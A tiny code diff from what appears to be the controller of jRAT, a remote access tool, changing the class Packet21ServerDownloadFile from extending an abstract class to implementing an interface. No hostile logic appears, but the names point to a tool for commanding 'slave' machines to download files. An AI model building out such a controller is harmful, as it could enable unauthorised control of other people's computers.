@@ -3,7 +3,7 @@ package jrat.controller.packets.outgoing;
 import jrat.controller.Slave;
 
 
-public class Packet21ServerDownloadFile extends AbstractOutgoingPacket {
+public class Packet21ServerDownloadFile implements OutgoingPacket {
 
 	private String file;
 
